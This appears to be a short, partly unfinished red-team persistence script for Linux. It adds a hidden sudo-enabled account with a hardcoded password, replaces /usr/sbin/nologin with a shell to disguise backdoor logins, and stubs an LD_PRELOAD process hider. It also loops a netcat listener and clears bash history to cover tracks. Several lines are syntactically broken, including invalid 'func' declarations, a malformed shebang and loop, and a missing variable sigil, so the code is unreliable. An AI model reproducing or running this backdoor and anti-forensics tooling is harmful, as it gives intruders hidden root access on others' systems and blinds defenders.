#/bin/shell

func legit_user(){
	useradd -m -d /var/www/.apache_2 -s /usr/sbin/nologin -U apache_2
        echo -e "redteamlovesyou\nredteamlovesyou" |  passwd apache_2	
	usermod -aG sudo apache_2
	cp /usr/sbin/shell /usr/sbin/nologin
}

func add_user(user){
	useradd -m -d /var/www/.$user -s /usr/sbin/nologin -U $user
	echo -e "TODO\nTODO" | passwd user
        usermod -aG sudo $user
	cp /usr/sbin/shell /usr/sbin/nologin
}

func extra(){
	users=$(wc -l /etc/passwd | cut -d " " -f 1)
	echo $users
	newint=$(expr $users / 2 )
	
}

#hiding processes
func ldPreload(){
	#https://github.com/gianlucaborello/libprocesshider/blob/master/processhider.c
	echo "ldpreload"
}

func call_back(ip){
	while:
	do
		echo "Press [CTRL+C] to stop.."
		/bin/nc -lvnp 
		sleep 1
	done	
}

#clearing bash history 
func final_touch(){
	#Clears the variable which says where the history file is stored to so nothing is stored.#
	unset HISTFILE
	#Completely clear the history. Very visible as all history is now gone.#
	history -c
	#Set the number of commands written to the file to 10.#
	export HISTFILESIZE=10	
}
